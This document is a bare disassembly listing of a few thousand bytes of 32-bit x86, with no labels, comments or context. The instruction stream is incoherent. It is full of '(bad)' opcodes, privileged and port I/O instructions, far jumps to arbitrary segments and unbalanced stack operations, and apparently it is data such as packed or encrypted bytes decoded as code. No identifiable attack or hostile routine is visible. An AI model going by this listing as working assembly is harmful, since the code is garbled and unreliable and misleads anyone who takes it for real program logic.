  4291f8:	mov    ch,0x3
  4291fa:	push   ecx
  4291fb:	add    ah,ch
  4291fd:	sbb    dh,BYTE PTR [eax]
  4291ff:	add    DWORD PTR [edi+0x20ce6073],0x2bef0ce
  429209:	push   ebp
  42920a:	push   cs
  42920b:	adc    al,0xb4
  42920d:	mov    ah,0x98
  42920f:	fsubr  st,st(3)
  429211:	hlt    
  429212:	fsub   QWORD PTR [edx+0x25]
  429216:	sbb    eax,0x7f1dcac6
  42921b:	add    edi,DWORD PTR [edi*1+0xd4af18e]
  429222:	test   BYTE PTR [esi],0xf3
  429225:	mov    ebp,0x5d8c4d16
  42922a:	daa    
  42922b:	pop    esi
  42922c:	mov    cl,0xb6
  42922e:	add    al,0x18
  429230:	and    eax,0x5a4a7519
  429235:	scas   eax,DWORD PTR es:[edi]
  429236:	lea    ebp,[ecx]
  429238:	outs   dx,BYTE PTR ds:[esi]
  429239:	cs ss mov esi,0x9783a257
  429240:	add    DWORD PTR [edx-0x5fff881d],0x7060fb74
  42924a:	test   eax,0x8655f415
  42924f:	push   0x5bc119ef
  429254:	cmp    DWORD PTR [ebp+0x3be805d5],esi
  42925a:	dec    ebp
  42925b:	xchg   ebx,eax
  42925c:	fs in  eax,dx
  42925e:	jmp    0xa952:0xcc29498b
  429265:	hlt    
  429266:	adc    eax,ecx
  429268:	imul   BYTE PTR [ecx+0x37ebbbcb]
  42926e:	lods   eax,DWORD PTR ds:[esi]
  42926f:	(bad)  
  429270:	cld    
  429271:	cdq    
  429272:	mov    ebx,0xdb86f9de
  429277:	jle    0x42926c
  429279:	xlat   BYTE PTR ds:[ebx]
  42927a:	aaa    
  42927b:	ror    DWORD PTR [ebx],1
  42927d:	cli    
  42927e:	loop   0x42927d
  429280:	xor    al,BYTE PTR [ebp+0x0]
  429283:	sub    al,0x57
  429285:	or     al,bl
  429287:	sti    
  429288:	(bad)  
  429289:	push   esp
  42928a:	adc    DWORD PTR [ecx+ecx*8+0x28],edi
  42928e:	add    BYTE PTR [eax-0x350fda9],ah
  429294:	scas   al,BYTE PTR es:[edi]
  429295:	pop    edi
  429296:	jl     0x42927d
  429298:	test   eax,0x14dfe7d3
  42929d:	es jne 0x42924d
  4292a0:	dec    edx
  4292a1:	inc    eax
  4292a2:	pop    ebx
  4292a3:	xor    cl,cl
  4292a5:	test   BYTE PTR [ebp+0x6d1d753c],dl
  4292ab:	mov    cl,0x49
  4292ad:	dec    eax
  4292ae:	xor    DWORD PTR [esi-0x1],esi
  4292b1:	xchg   ebx,eax
  4292b2:	dec    ebp
  4292b3:	adc    eax,0x1262e2ee
  4292b8:	jae    0x4292b5
  4292ba:	shr    DWORD PTR [edi],1
  4292bc:	ret    0x7562
  4292bf:	or     al,0xd1
  4292c1:	jbe    0x429249
  4292c3:	adc    bh,0xb5
  4292c6:	xchg   DWORD PTR [edi],ebx
  4292c8:	jns    0x42927e
  4292ca:	jns    0x429252
  4292cc:	adc    al,0xa6
  4292ce:	push   0x95da36fc
  4292d3:	sub    eax,0xc44db5a4
  4292d8:	imul   ecx,DWORD PTR [edi-0x5f],0x1d
  4292dc:	outs   dx,DWORD PTR ds:[esi]
  4292dd:	and    ecx,esi
  4292df:	push   esp
  4292e0:	sti    
  4292e1:	loope  0x4292bc
  4292e3:	xchg   BYTE PTR [ecx-0x633379da],ah
  4292e9:	or     bh,bh
  4292eb:	mov    WORD PTR [ebp+0x70d323b4],ss
  4292f1:	lds    ebx,FWORD PTR [edx-0x41e09650]
  4292f7:	in     al,0xac
  4292f9:	dec    esp
  4292fa:	dec    eax
  4292fb:	lods   al,BYTE PTR ds:[esi]
  4292fc:	lea    esi,[eax]
  4292fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4292ff:	mov    al,ds:0x4629ac59
  429304:	inc    edi
  429305:	imul   ecx,DWORD PTR [ecx],0xffffff84
  429308:	mov    edx,edx
  42930a:	mov    al,0x19
  42930c:	add    al,0x96
  42930e:	jae    0x429327
  429310:	lahf   
  429311:	push   eax
  429312:	xchg   BYTE PTR [eax],ch
  429314:	dec    eax
  429315:	int3   
  429316:	and    BYTE PTR [eax-0x6b],bh
  429319:	xor    cl,dh
  42931b:	sub    ah,al
  42931d:	lahf   
  42931e:	jmp    0x8219:0xd6507801
  429325:	or     al,0xf
  429327:	scas   al,BYTE PTR es:[edi]
  429328:	or     DWORD PTR [ebx+0x3f],eax
  42932b:	mov    ecx,0x605015f0
  429330:	jo     0x42931f
  429332:	loopne 0x42939e
  429334:	popf   
  429335:	outs   dx,BYTE PTR ds:[esi]
  429336:	test   al,ch
  429338:	and    BYTE PTR [ecx-0x546b64ff],bl
  42933e:	inc    ebp
  42933f:	inc    esp
  429340:	fidiv  DWORD PTR [ebp+0x47]
  429343:	pop    esi
  429344:	jg     0x4292cd
  429346:	mov    BYTE PTR [eax+0x51],ch
  429349:	adc    DWORD PTR [eax],ebx
  42934b:	ret    0x470e
  42934e:	out    0xd7,eax
  429350:	inc    ecx
  429351:	ds cli 
  429353:	bound  ebp,QWORD PTR [eax+edi*4+0x1dcc41ab]
  42935a:	das    
  42935b:	pop    esi
  42935c:	jno    0x4292fd
  42935e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42935f:	pop    esp
  429360:	mov    esi,DWORD PTR [edx]
  429362:	push   ebp
  429363:	addr16 mov al,ds:0xcb90
  429367:	cwde   
  429368:	cs std 
  42936a:	xchg   edi,eax
  42936b:	cli    
  42936c:	xlat   BYTE PTR ds:[ebx]
  42936d:	mov    eax,0xa9f4305c
  429372:	std    
  429373:	adc    dl,ch
  429375:	jne    0x42939e
  429377:	mov    dh,0x17
  429379:	jl     0x429306
  42937b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42937c:	cmp    bh,BYTE PTR [esi]
  42937e:	push   es
  42937f:	in     eax,0x6
  429381:	push   eax
  429382:	out    dx,al
  429383:	jle    0x4293ec
  429385:	mov    cl,0x3e
  429387:	push   0x46f2e6f8
  42938c:	sbb    eax,0xa4c4daaa
  429391:	push   ebp
  429392:	jle    0x4293f9
  429394:	xor    BYTE PTR [ebx-0x151601a6],0xd
  42939b:	cmc    
  42939c:	imul   ecx,edi,0xffffffde
  42939f:	cmc    
  4293a0:	into   
  4293a1:	pop    ebx
  4293a2:	outs   dx,BYTE PTR ds:[esi]
  4293a3:	sti    
  4293a4:	lods   eax,DWORD PTR ds:[esi]
  4293a5:	xlat   BYTE PTR ds:[ebx]
  4293a6:	pop    ebp
  4293a7:	xor    BYTE PTR [ecx+0x29],0x61
  4293ab:	mov    edi,0xdcf41f90
  4293b0:	xor    ch,BYTE PTR [edi]
  4293b2:	add    DWORD PTR [ebx+0x1e],ecx
  4293b5:	ja     0x429392
  4293b7:	arpl   WORD PTR [ecx+0x14a4be08],sp
  4293bd:	add    al,dl
  4293bf:	sub    eax,DWORD PTR [ecx+0x5f8efd6f]
  4293c5:	clc    
  4293c6:	into   
  4293c7:	lea    ecx,[ebp+0x261dbf0b]
  4293cd:	push   ebp
  4293ce:	in     eax,0xbd
  4293d0:	daa    
  4293d1:	pop    edi
  4293d2:	add    eax,0x1d7dc0b8
  4293d7:	mov    eax,0x243a9506
  4293dc:	mov    bl,0x8d
  4293de:	dec    eax
  4293df:	ins    DWORD PTR es:[edi],dx
  4293e0:	stos   DWORD PTR es:[edi],eax
  4293e1:	lods   eax,DWORD PTR ds:[esi]
  4293e2:	stos   DWORD PTR es:[edi],eax
  4293e3:	push   esi
  4293e4:	rcr    bl,cl
  4293e6:	test   DWORD PTR [esi],0x4112160d
  4293ec:	fstp   QWORD PTR [esi-0x25]
  4293ef:	test   al,0x83
  4293f1:	repnz adc eax,0x758e76e9
  4293f7:	enter  0x2063,0x70
  4293fb:	and    eax,0xf4473c88
  429400:	push   ebx
  429401:	mov    ah,0xd5
  429403:	push   ss
  429404:	rcl    BYTE PTR [ecx+0x7fae688b],cl
  42940a:	add    ch,ch
  42940c:	clc    
  42940d:	xor    ah,BYTE PTR [edx-0x2c93f334]
  429413:	loop   0x429434
  429415:	mov    ah,0x1
  429417:	xor    ah,BYTE PTR [ebx-0x60]
  42941a:	or     eax,0x68809cc0
  42941f:	cmc    
  429420:	lock pop ebp
  429422:	inc    esp
  429423:	push   eax
  429424:	cli    
  429425:	fsub   st(5),st
  429427:	sti    
  429428:	and    eax,0x1e565081
  42942d:	adc    edx,0xb880c7f9
  429433:	lods   al,BYTE PTR ds:[esi]
  429434:	sub    bh,0x45
  429437:	push   ebx
  429438:	jge    0x42945f
  42943a:	scas   eax,DWORD PTR es:[edi]
  42943b:	xchg   ebp,eax
  42943c:	add    al,0x12
  42943e:	fstp   DWORD PTR [ebx+ebx*2+0x2d]
  429442:	sub    BYTE PTR [edx],0x60
  429445:	pop    ecx
  429446:	mov    bh,0x62
  429448:	mov    dl,0xf1
  42944a:	cld    
  42944b:	xor    DWORD PTR [ecx+0x57],ebp
  42944e:	and    BYTE PTR [ecx],bh
  429450:	nop
  429451:	cmp    BYTE PTR ds:0x55016258,ch
  429457:	(bad)  
  429458:	aad    0x56
  42945a:	test   BYTE PTR [eax+0x50dc78b5],ah
  429460:	ja     0x4294b9
  429462:	imul   ecx,DWORD PTR [eax+0x4b],0x1b0203d9
  429469:	jae    0x429408
  42946b:	mov    ebx,0xf5d75872
  429470:	dec    eax
  429471:	adc    BYTE PTR [edx+esi*1],ah
  429474:	add    al,0xe
  429476:	add    al,0xd
  429478:	inc    edi
  429479:	scas   al,BYTE PTR es:[edi]
  42947a:	push   0xffffff9f
  42947c:	mov    ?,eax
  42947e:	addr16 pop edi
  429480:	xor    DWORD PTR [ebp+0x318823b5],0xffffffa1
  429487:	sub    eax,0x67cb9053
  42948c:	icebp  
  42948d:	inc    eax
  42948e:	mov    eax,0x77401807
  429493:	outs   dx,DWORD PTR ds:[esi]
  429494:	push   ss
  429495:	mov    ecx,0xcb3afb64
  42949a:	iret   
  42949b:	sti    
  42949c:	add    eax,0x47152bb6
  4294a1:	pop    ds
  4294a2:	ss je  0x4294dd
  4294a5:	add    dl,BYTE PTR [ecx+ebp*4+0x69]
  4294a9:	ss and al,0x99
  4294ad:	loopne 0x4294d9
  4294af:	xorps  xmm0,XMMWORD PTR [eax+0x1820a2c4]
  4294b6:	sub    BYTE PTR [ecx+eiz*4+0x57a36939],ch
  4294bd:	ins    BYTE PTR es:[edi],dx
  4294be:	adc    ebx,DWORD PTR [edx+0x5bca8d98]
  4294c4:	(bad)  
  4294c5:	mov    bl,0x73
  4294c7:	jmp    0xaff8:0x5d726cf2
  4294ce:	addr16 out dx,al
  4294d0:	jp     0x4294b9
  4294d2:	jmp    0x4294d3
  4294d4:	cld    
  4294d5:	or     eax,0x7400bfaf
  4294da:	adc    eax,0xbf028b59
  4294df:	in     al,dx
  4294e0:	jmp    FWORD PTR [ebx]
  4294e2:	sub    DWORD PTR [ecx-0x7e42a39],eax
  4294e8:	xchg   edx,eax
  4294e9:	push   ebx
  4294ea:	add    BYTE PTR [eax-0x51],al
  4294ed:	add    al,0x5e
  4294ef:	icebp  
  4294f0:	popf   
  4294f1:	mov    edi,0x4fa75df0
  4294f6:	pop    edi
  4294f7:	cld    
  4294f8:	lods   eax,DWORD PTR ds:[esi]
  4294f9:	push   0x52
  4294fb:	push   ebp
  4294fc:	fidivr WORD PTR [ebx]
  4294fe:	sar    BYTE PTR [esi],cl
  429500:	repz add BYTE PTR [esi],cl
  429503:	dec    esi
  429504:	pop    ebp
  429505:	push   esi
  429506:	data16 jmp 0x42951f
  429509:	aam    0xf4
  42950b:	popa   
  42950c:	push   0xffffffa3
  42950e:	push   ss
  42950f:	cdq    
  429510:	and    al,0xe3
  429512:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429513:	pop    ss
  429514:	lods   eax,DWORD PTR ds:[esi]
  429515:	or     al,0x54
  429517:	sahf   
  429518:	iret   
  429519:	std    
  42951a:	mov    ah,BYTE PTR [eax+0x18]
  42951d:	push   cs
  42951e:	xchg   esp,eax
  42951f:	adc    eax,0x969720a4
  429524:	xlat   BYTE PTR ds:[ebx]
  429525:	push   0xffffffe3
  429527:	or     DWORD PTR [ebx+0x7c],eax
  42952a:	inc    esi
  42952b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42952c:	sbb    eax,0xc42da3b4
  429531:	sbb    ebx,DWORD PTR [esi]
  429533:	inc    esi
  429534:	jnp    0x42952b
  429536:	imul   eax,esp,0x53c887b0
  42953c:	fs dec ecx
  42953e:	push   esi
  42953f:	outs   dx,DWORD PTR ds:[esi]
  429540:	iret   
  429541:	loopne 0x429577
  429543:	add    ah,BYTE PTR [ebp+0x677edb4a]
  429549:	add    al,0x69
  42954b:	pushf  
  42954c:	cs (bad) 
  42954e:	xchg   esp,eax
  42954f:	and    DWORD PTR [edx+0x94ab03a],edx
  429555:	cmp    al,0x12
  429557:	mov    dl,0x24
  429559:	in     eax,dx
  42955a:	sbb    BYTE PTR [eax+eax*1+0x3c4139],al
  429561:	mov    dh,0xd2
  429563:	pusha  
  429564:	das    
  429565:	xchg   esi,eax
  429566:	scas   al,BYTE PTR es:[edi]
  429567:	adc    ecx,0xffffffa6
  42956a:	cmp    ebx,DWORD PTR ds:0x7a2dda10
  429570:	mov    cl,0x5e
  429572:	jbe    0x4295b7
  429574:	ror    DWORD PTR [ecx+0x6b],1
  429577:	and    eax,0x2fc2a08
  42957c:	sub    eax,0xa3d2a23c
  429581:	outs   dx,DWORD PTR ds:[esi]
  429582:	shl    BYTE PTR [ebp+0x4db0fd16],0x1f
  429589:	ss inc ebp
  42958b:	ror    DWORD PTR [esi],0x44
  42958e:	or     dh,BYTE PTR [edx+edi*4-0x30d8d220]
  429595:	(bad)  
  429596:	fisttp DWORD PTR [eax+0x46]
  429599:	(bad)  
  42959a:	jmp    0x118:0x64c8d134
  4295a1:	imul   ecx,DWORD PTR [eax],0x40
  4295a4:	push   ds
  4295a5:	add    bl,ah
  4295a7:	call   0xebde:0xecc62f93
  4295ae:	jno    0x429594
  4295b0:	jmp    0xc9c8:0x35edec75
  4295b7:	mov    esp,0x18941a17
  4295bc:	rol    eax,cl
  4295be:	jne    0x4295f7
  4295c0:	sub    ebx,ebp
  4295c2:	add    DWORD PTR [ecx-0x3b],esi
  4295c5:	jecxz  0x4295f6
  4295c7:	ret    0xde5d
  4295ca:	and    DWORD PTR [ecx-0x4],0xffffffdf
  4295ce:	pop    edi
  4295cf:	daa    
  4295d0:	push   eax
  4295d1:	jg     0x4295f0
  4295d3:	sti    
  4295d4:	ret    0xa31d
  4295d7:	fwait
  4295d8:	jae    0x42955e
  4295da:	pusha  
  4295db:	jge    0x4295e0
  4295dd:	sahf   
  4295de:	lods   eax,DWORD PTR ds:[esi]
  4295df:	pop    es
  4295e0:	add    ebp,eax
  4295e2:	push   0x22
  4295e4:	retf   0x9770
  4295e7:	rcr    al,cl
  4295e9:	rol    esi,cl
  4295eb:	test   BYTE PTR [esi],dh
  4295ed:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4295ef:	xor    bh,ch
  4295f1:	dec    ecx
  4295f2:	sbb    BYTE PTR [ebp-0xe4c3473],0xb5
  4295f9:	jl     0x4295c6
  4295fb:	leave  
  4295fc:	fcmovnu st,st(7)
  4295fe:	jbe    0x4295cb
  429600:	sbb    eax,0x79e3796f
  429605:	in     al,dx
  429606:	pop    ss
  429607:	repnz sub ebp,DWORD PTR [ecx]
  42960a:	and    BYTE PTR [ebp-0x31],0x2f
  42960e:	ret    
  42960f:	or     al,BYTE PTR [eax-0x7ffe6a7d]
  429615:	das    
  429616:	sahf   
  429617:	and    bh,al
  429619:	xchg   edx,eax
  42961a:	push   esp
  42961b:	add    BYTE PTR [eax+0x7cf9812a],al
  429621:	out    dx,al
  429622:	mov    edi,0xe57f7bfd
  429627:	cmp    ecx,DWORD PTR [esi-0x61]
  42962a:	mov    esi,0xec7e5bf0
  42962f:	inc    edi
  429630:	mov    eax,ds:0xc08c04f3
  429635:	ret    
  429636:	mov    bl,0x8e
  429638:	jb     0x4296b0
  42963a:	stos   BYTE PTR es:[edi],al
  42963b:	mov    ch,0xc5
  42963d:	xchg   esp,eax
  42963e:	inc    eax
  42963f:	push   0xffffffa2
  429641:	dec    ebp
  429642:	enter  0xb311,0x28
  429646:	jp     0x4296b9
  429648:	dec    ebx
  429649:	in     eax,0xd9
  42964b:	(bad)  
  42964c:	cs mov ah,0x2
  42964f:	or     BYTE PTR [eax-0x7],ch
  429652:	sub    al,0x11
  429654:	lods   al,BYTE PTR ds:[esi]
  429655:	mov    eax,ds:0x72be187
  42965a:	pop    edi
  42965b:	adc    eax,esp
  42965d:	addr16 int3 
  42965f:	gs inc edi
  429661:	or     DWORD PTR [ebp+0x6f],eax
  429664:	fadd   DWORD PTR [eax-0x46]
  429667:	jmp    0x4e33:0xd8840282
  42966e:	adc    dh,BYTE PTR [ebp+0x73]
  429671:	cmp    DWORD PTR [edi+0x12a82940],ecx
  429677:	push   0x5205b919
  42967c:	or     esp,esp
  42967e:	ins    BYTE PTR es:[edi],dx
  42967f:	test   eax,0x82ed123f
  429684:	xor    eax,DWORD PTR [eax+0x6c412849]
  42968a:	clc    
  42968b:	mov    BYTE PTR [eax-0x25],dl
  42968e:	jne    0x4296cb
  429690:	or     al,BYTE PTR [ecx+ebx*4-0x7b]
  429694:	cmp    eax,0x36616f19
  429699:	jmp    0x4296a9
  42969b:	sub    eax,0xc55621da
  4296a0:	adc    ah,dl
  4296a2:	adc    DWORD PTR [ecx],0x31
  4296a5:	ret    0x110
  4296a8:	mov    BYTE PTR [ebp+edx*2+0x39551a15],bl
  4296af:	inc    ebx
  4296b0:	add    eax,0xfc56b391
  4296b5:	add    eax,0x74001867
  4296ba:	mov    eax,0xaf783909
  4296bf:	xchg   ebp,eax
  4296c0:	xchg   edi,eax
  4296c1:	gs and al,0x36
  4296c4:	push   ebx
  4296c5:	rcl    ch,1
  4296c7:	push   0x4d57d
  4296cc:	into   
  4296cd:	imul   ecx,DWORD PTR [esi-0x7fb04ba3],0x23029ea1
  4296d7:	loopne 0x4296c3
  4296d9:	xchg   DWORD PTR [esi+0x3d71b20e],edi
  4296df:	es jmp 0x4296f5
  4296e2:	in     al,dx
  4296e3:	ins    BYTE PTR es:[edi],dx
  4296e4:	dec    ebp
  4296e5:	sti    
  4296e6:	loope  0x429691
  4296e8:	pop    ebp
  4296e9:	mov    cl,BYTE PTR [edi+0x14abcf3b]
  4296ef:	arpl   WORD PTR [ebp-0x79d75781],dx
  4296f5:	scas   al,BYTE PTR es:[edi]
  4296f6:	in     eax,0xd7
  4296f8:	ss push ebx
  4296fa:	adc    al,0x5d
  4296fc:	add    DWORD PTR [ebp+edi*8-0x3be142d1],esi
  429703:	xor    BYTE PTR [eax+ebp*8+0x3c],al
  429707:	cmp    BYTE PTR [edi+0x21e75f40],ah
  42970d:	je     0x4296e6
  42970f:	sbb    DWORD PTR [eax],eax
  429711:	lods   al,BYTE PTR ds:[esi]
  429712:	(bad)  
  429713:	and    ch,BYTE PTR [ebx]
  429715:	leave  
  429716:	dec    edx
  429717:	shl    DWORD PTR [esi],cl
  429719:	and    esi,ebp
  42971b:	mov    al,0x9e
  42971d:	or     eax,DWORD PTR [eax]
  42971f:	fistp  DWORD PTR [ebx]
  429721:	fwait
  429722:	rcl    ecx,cl
  429724:	xor    eax,0x1f03c378
  429729:	clc    
  42972a:	popf   
  42972b:	aaa    
  42972c:	fdivr  st(5),st
  42972e:	sti    
  42972f:	outs   dx,DWORD PTR ds:[esi]
  429730:	pop    ebp
  429731:	out    0xf6,al
  429733:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429734:	inc    edi
  429735:	mov    ecx,0x7c19483f
  42973a:	scas   al,BYTE PTR es:[edi]
  42973b:	loope  0x42973e
  42973d:	sub    BYTE PTR [edi],0x2b
  429740:	add    BYTE PTR [eax],al
  429742:	add    ecx,DWORD PTR [edi-0x20]
  429745:	mov    ebx,0xa795e17e
  42974a:	dec    esi
  42974b:	pop    ebp
  42974c:	jl     0x429791
  42974e:	sbb    bl,dh
  429750:	mov    dh,bh
  429752:	mov    ?,WORD PTR [eax+ebp*4-0x40]
  429756:	push   esi
  429757:	inc    eax
  429758:	loop   0x429716
  42975a:	jne    0x42973a
  42975c:	cmp    edx,ebp
  42975e:	push   0xffffffb7
  429760:	push   ebx
  429761:	adc    edx,DWORD PTR [ebp+0x4d252ee3]
  429767:	adc    edx,DWORD PTR [esi]
  429769:	cmp    ch,bh
  42976b:	std    
  42976c:	jg     0x42973a
  42976e:	or     dl,BYTE PTR [ebp+0x3c0ab34f]
  429774:	jnp    0x42972f
  429776:	adc    al,0x9c
  429778:	clc    
  429779:	fisub  DWORD PTR [ecx+0x69247b1e]
  42977f:	ror    eax,1
  429781:	adc    al,0x39
  429783:	int3   
  429784:	rcl    BYTE PTR [ebx+0x678ddc19],0x30
  42978b:	mov    ebx,0xbd621cea
  429790:	add    ebx,DWORD PTR [eax+0x380644b5]
  429796:	dec    ebp
  429797:	mov    al,ds:0x4c40b825
  42979c:	inc    eax
  42979d:	sahf   
  42979e:	daa    
  42979f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4297a0:	jns    0x4297e6
  4297a2:	cmp    ecx,DWORD PTR [edi+0x98bf23a]
  4297a8:	inc    eax
  4297a9:	out    dx,al
  4297aa:	xor    cl,BYTE PTR [edx]
  4297ac:	inc    eax
  4297ad:	inc    esp
  4297ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4297af:	or     BYTE PTR [ecx+0x41],ah
  4297b2:	dec    esi
  4297b3:	dec    edx
  4297b4:	retf   0x2e21
  4297b7:	imul   ebx,DWORD PTR [edi+0x3e],0xffffffa0
  4297bb:	cmp    eax,0xa3008901
  4297c0:	cmc    
  4297c1:	(bad)  
  4297c2:	mov    ecx,0xe234a482
  4297c7:	mov    ch,0x74
  4297c9:	in     eax,0xd1
  4297cb:	add    BYTE PTR [edx+0x7a],bh
  4297ce:	stos   DWORD PTR es:[edi],eax
  4297cf:	add    al,0x48
  4297d1:	in     al,dx
  4297d2:	inc    ebx
  4297d3:	sbb    al,0x72
  4297d5:	add    al,0x4
  4297d7:	stos   DWORD PTR es:[edi],eax
  4297d8:	add    al,0xf4
  4297da:	(bad)  
  4297db:	jmp    0x92bbecc6
  4297e0:	push   ebp
  4297e1:	loop   0x429824
  4297e3:	pusha  
  4297e4:	aad    0x95
  4297e6:	add    BYTE PTR [edx+0x384d9007],dh
  4297ec:	in     eax,dx
  4297ed:	cwde   
  4297ee:	into   
  4297ef:	and    DWORD PTR [ecx-0x3137da3c],0x2f042b32
  4297f9:	xor    eax,0xdf3de8e
  4297fe:	mov    al,ds:0x75f0239d
  429803:	shr    BYTE PTR [esi+eiz*4+0x13],0x71
  429808:	or     ch,BYTE PTR [edx]
  42980a:	dec    edi
  42980b:	shl    BYTE PTR [eax-0x4d17f8a7],0x30
  429812:	xor    DWORD PTR [edx],0x62
  429815:	bound  esi,QWORD PTR [ebp+edx*2-0x64]
  429819:	pop    ebp
  42981a:	mov    BYTE PTR [eax],dh
  42981c:	or     al,0xf6
  42981e:	mov    esi,DWORD PTR [edi-0x30]
  429821:	popa   
  429822:	add    DWORD PTR [ebp-0x5054af5a],edi
  429828:	inc    edx
  429829:	out    dx,eax
  42982a:	sbb    eax,0xb23ecd77
  42982f:	test   al,0x50
  429831:	mov    al,ds:0x86ce539e
  429836:	div    BYTE PTR [edi+0x25fa7b59]
  42983c:	jne    0x429825
  42983e:	outs   dx,DWORD PTR ds:[esi]
  42983f:	sti    
  429840:	int3   
  429841:	out    0x6e,al
  429843:	jge    0x42989a
  429845:	jl     0x42980a
  429847:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429848:	outs   dx,DWORD PTR ds:[esi]
  429849:	std    
  42984a:	int    0xb7
  42984c:	fdiv   QWORD PTR [ebx-0x15]
  42984f:	mov    ebx,0xf0b9622e
  429854:	pop    ds
  429855:	in     al,0xd
  429857:	sub    al,0xee
  429859:	jae    0x429880
  42985b:	gs mov al,0x4c
  42985e:	or     DWORD PTR [eax-0x1f],esp
  429861:	icebp  
  429862:	pop    ss
  429863:	inc    ebp
  429864:	or     DWORD PTR [ecx+ecx*2+0x2b],edi
  429868:	add    BYTE PTR [eax+0x0],ah
  42986b:	or     al,0x7e
  42986d:	iret   
  42986e:	das    
  42986f:	jle    0x429834
  429871:	ret    
  429872:	maxps  xmm7,XMMWORD PTR [ebx+esi*2+0x18]
  429877:	rcl    DWORD PTR [ecx+0x17],1
  42987a:	add    al,BYTE PTR [ebp+0x3e5bd5a0]
  429880:	js     0x4298e5
  429882:	lods   eax,DWORD PTR ds:[esi]
  429883:	mov    cl,0x6a
  429885:	xor    dl,BYTE PTR [eax]
  429887:	mov    dl,0xa5
  429889:	je     0x42985d
  42988b:	mov    esp,0x29b7e9d5
  429890:	push   0x35
  429892:	xchg   edi,eax
  429893:	add    BYTE PTR [edx-0x78],dl
  429896:	pop    ds
  429897:	push   es
  429898:	stos   DWORD PTR es:[edi],eax
  429899:	arpl   ax,bx
  42989b:	xchg   ebx,eax
  42989c:	scas   al,BYTE PTR es:[edi]
  42989d:	fs xchg esp,eax
  42989f:	mov    dh,0x60
  4298a1:	pop    ecx
  4298a2:	lods   eax,DWORD PTR ds:[esi]
  4298a3:	mov    cl,BYTE PTR [ebx]
  4298a5:	push   cs
  4298a6:	mov    ds:0x20b00d71,eax
  4298ab:	dec    ecx
  4298ac:	inc    esp
  4298ad:	adc    esi,edi
  4298af:	sub    BYTE PTR [edx+0x6],0x3a
  4298b3:	xor    al,BYTE PTR [ebp+0x7a]
  4298b6:	loope  0x429875
  4298b8:	enter  0x73ab,0x20
  4298bc:	sub    eax,edx
  4298be:	in     eax,0xf3
  4298c0:	or     ah,ah
  4298c2:	jl     0x429883
  4298c4:	fcomp  DWORD PTR [edx]
  4298c6:	mov    ebp,0xf356f335
  4298cb:	stc    
  4298cc:	pop    ecx
  4298cd:	sbb    al,0x2
  4298d0:	fs mov ch,0xc
  4298d3:	cmp    DWORD PTR [ebx],esp
  4298d5:	jae    0x42987a
  4298d7:	jge    0x4298d1
  4298d9:	sub    DWORD PTR [edx],esp
  4298db:	mov    bl,0xb5
  4298dd:	call   0x41a5:0x3f770a2
  4298e4:	inc    edi
  4298e5:	jb     0x429919
  4298e7:	bound  edx,QWORD PTR [edx]
  4298e9:	xchg   BYTE PTR [esp+ebp*4-0x5df642d2],al
  4298f0:	sbb    BYTE PTR [ebx+0x28c24151],ah
  4298f6:	imul   ebp,DWORD PTR [edi+ebp*4+0x48],0x3f
  4298fb:	sbb    DWORD PTR [ebp+0x715a7d02],0xded13da7
  429905:	jp     0x4298fd
  429907:	adc    esi,DWORD PTR [edx+0x47]
  42990a:	iret   
  42990b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42990c:	sbb    al,0x62
  42990e:	xchg   BYTE PTR [esi-0x6162aaa8],bl
  429914:	sub    eax,0x6e51fd73
  429919:	stos   BYTE PTR es:[edi],al
  42991a:	adc    BYTE PTR [esi],cl
  42991c:	outs   dx,DWORD PTR ds:[esi]
  42991d:	fild   WORD PTR [ecx+edi*4]
  429920:	jmp    0x42994d
  429922:	xor    DWORD PTR [esi+0x59],ebx
  429925:	xchg   DWORD PTR [eax],esi
  429927:	arpl   WORD PTR [esi],di
  429929:	sub    eax,0x2e6096e3
  42992e:	mov    esi,0xb51dae81
  429933:	xchg   edx,eax
  429934:	hlt    
  429935:	out    0xba,eax
  429937:	in     al,0xfc
  429939:	mov    esi,DWORD PTR [eax+0x77]
  42993c:	xlat   BYTE PTR ds:[ebx]
  42993d:	gs lock mov edx,0xa57da05e
  429944:	shl    ebp,0x38
  429947:	dec    esp
  429948:	add    al,0x6f
  42994a:	shl    DWORD PTR [edi+0x50f4159d],cl
  429950:	jno    0x42994d
  429952:	pop    es
  429953:	retf   0xb243
  429956:	pop    esi
  429957:	repz xchg esp,eax
  429959:	sbb    DWORD PTR [eax+0x1198da12],0x7e5cea73
  429963:	mov    BYTE PTR [eax-0x9],ah
  429966:	ret    0x25f6
  429969:	pop    esi
  42996a:	fnstcw WORD PTR [esi-0x3d]
  42996d:	mov    ebp,0x3bdd7cef
  429972:	out    dx,al
  429973:	jg     0x429974
  429975:	jnp    0x4299a6
  429977:	arpl   WORD PTR [ecx],di
  429979:	enter  0x68b7,0xe5
  42997d:	xchg   edi,eax
  42997e:	mov    ebp,0xf105257e
  429983:	mov    ecx,0xf7288600
  429988:	pop    edi
  429989:	push   esi
  42998a:	add    BYTE PTR [esi+0x77f02515],dh
  429990:	jmp    ecx
  429992:	das    
  429993:	fistp  QWORD PTR [edi+ecx*8+0x3d]
  429997:	sbb    ebp,DWORD PTR [edi+0x73]
  42999a:	xor    eax,0x472be0dd
  42999f:	fidivr WORD PTR [ebx]
  4299a1:	js     0x42998a
  4299a3:	rcl    BYTE PTR [ebp-0x7c2084f9],0x83
  4299aa:	es enter 0x2539,0xe4
  4299af:	or     ah,al
  4299b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4299b2:	test   DWORD PTR [ebx+ebp*8-0x1d],eax
  4299b6:	into   
  4299b7:	bound  ebp,QWORD PTR [esi]
  4299b9:	lods   al,BYTE PTR ds:[esi]
  4299ba:	mov    edx,0xb93d7d83
  4299bf:	adc    eax,0x41c31498
  4299c4:	test   DWORD PTR ds:0xce04b346,ecx
  4299ca:	add    DWORD PTR [esi],ebp
  4299cc:	add    al,0x54
  4299ce:	jecxz  0x429970
  4299d0:	add    eax,0xdcc5ae3c
  4299d5:	pop    edi
